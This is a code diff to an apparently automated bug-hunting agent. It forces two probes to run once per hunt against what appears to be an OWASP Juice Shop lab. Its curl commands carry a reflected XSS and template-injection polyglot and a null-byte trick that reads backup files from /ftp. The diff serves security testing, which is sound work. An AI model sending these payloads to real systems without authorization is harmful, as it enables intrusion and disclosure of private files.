@@ -908,18 +908,28 @@ async function agentIteration(huntId, target, recon, findings, iteration, playbo
   // for OTHER vuln classes grounded in recon-discovered endpoints — XSS on
   // search, business-logic on basket, IDOR on basket. All go through the same
   // assessResult pipeline; validators are NOT loosened.
+  // DIVERSITY probe execution guarantee — per-hunt record of which
+  // hand-verified deterministic probes have already run (persisted to
+  // meta.json so a restart doesn't re-fire them).
+  let detFrontProbes = [];
+  const detRun = new Set(((readHuntMeta(huntId) || {}).deterministicProbesRun) || []);
   try {
     const eps = (recon.endpoints || []).map((e) => String(e).trim());
     const baseUrl = target.replace(/\/$/, '');
     const plansMention = (re) => plans.some((p) => re.test(`${p.test || ''} ${p.command || ''}`));
     const diversityTests = [];
+    // Deterministic probes (hand-verified, safe read-only) go to the FRONT
+    // of the execution window exactly once per hunt — see the guarantee block
+    // after the chain-pursuit injection below.
+    const detFront = [];
 
     // 1. XSS on search endpoints — search is the classic reflected-XSS sink.
     // Also carries an SSTI polyglot ({{7*7}}): if the backend renders the
     // query through a template engine, the response contains "49".
     const searchEp = eps.find((e) => /search/i.test(e) && /^\/(api|rest)/.test(e));
-    if (searchEp && !plansMention(/xss|cross.?site|<script/i)) {
-      diversityTests.push({
+    if (searchEp && !plansMention(/xss|cross.?site|<script/i) && !detRun.has('ssti-polyglot-search')) {
+      detFront.push({
+        detId: 'ssti-polyglot-search',
         test: 'Reflected XSS + SSTI polyglot on search',
         command: `curl -sk "${baseUrl}${searchEp}?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E%7B%7B7*7%7D%7D" | head -c 2000`,
         why: 'Search endpoints often reflect input unsanitised — classic reflected XSS; the {{7*7}} polyglot also flags server-side template injection if the response contains 49',
@@ -969,14 +979,17 @@ async function agentIteration(huntId, target, recon, findings, iteration, playbo
     // registered test account in scope), SSRF/Gravatar (needs an authed
     // session the driver does not hold), RCE (no grounded vector in this lab).
     // Revisit only if recon discovers new endpoints.
-    if (!plansMention(/\/ftp|lfi|path.?traversal|directory.?list|backup.?file/i)) {
-      diversityTests.push({
+    if (!plansMention(/\/ftp|lfi|path.?traversal|directory.?list|backup.?file/i) && !detRun.has('ftp-lfi-backup')) {
+      detFront.push({
+        detId: 'ftp-lfi-backup',
         test: 'FTP directory listing + backup file disclosure',
         command: `{ echo '--- /ftp/ listing ---'; curl -sk "${baseUrl}/ftp/" | head -c 600; echo; echo '--- backup file via null-byte ---'; curl -sk "${baseUrl}/ftp/package.json.bak%00.md" | head -c 2000; }`,
         why: 'Juice Shop ships an /ftp directory listing and backup files; the null-byte trick defeats the .md allowlist — both verified live against this lab container',
         hypothesis: '/ftp may expose directory listing and backup files readable without authentication',
       });
     }
+
+    if (detFront.length) detFrontProbes = detFront;
 
     if (diversityTests.length) {
       plans.push(...diversityTests);
@@ -1026,6 +1039,30 @@ async function agentIteration(huntId, target, recon, findings, iteration, playbo
       }
     }
   } catch { /* chain pursuit is best-effort */ }
+
+  // DETERMINISTIC PROBE EXECUTION GUARANTEE (19 Oct 2026, solver #125):
+  // the two hand-verified deterministic probes (SSTI polyglot on search,
+  // /ftp LFI backup disclosure) were injected into `plans` but NEVER
+  // executed — plans.push() put them at the END while execution only takes
+  // slice(0,3), and chain tests unshift to the FRONT and crowd them out
+  // (observed live 19 Oct 2026: 2 injection windows, 0 executions; XSS
+  // diversity probes historically 0 executions). Suggested tests the model
+  // never runs are not a discovery frontier. So these two run exactly once
+  // per hunt, at the very FRONT of the execution window (after chain
+  // injection, so nothing outranks them). Same assessResult pipeline;
+  // validators untouched; probes are safe read-only GETs verified live
+  // against the lab container before coding.
+  if (detFrontProbes.length) {
+    plans.unshift(...detFrontProbes);
+    think(huntId, `Deterministic probes forced to front (once per hunt, guaranteed execution): ${detFrontProbes.map((t) => t.test).join(', ')}`);
+    try {
+      writeHuntMeta(huntId, {
+        ...(readHuntMeta(huntId) || {}),
+        huntId,
+        deterministicProbesRun: [...detRun, ...detFrontProbes.map((t) => t.detId)],
+      });
+    } catch { /* once-per-hunt record is best-effort */ }
+  }
 
   if (!plans.length) {
     // HUMAN-LIKE FALLBACK: The model thinks like a human ("Test: ...", "What if...",
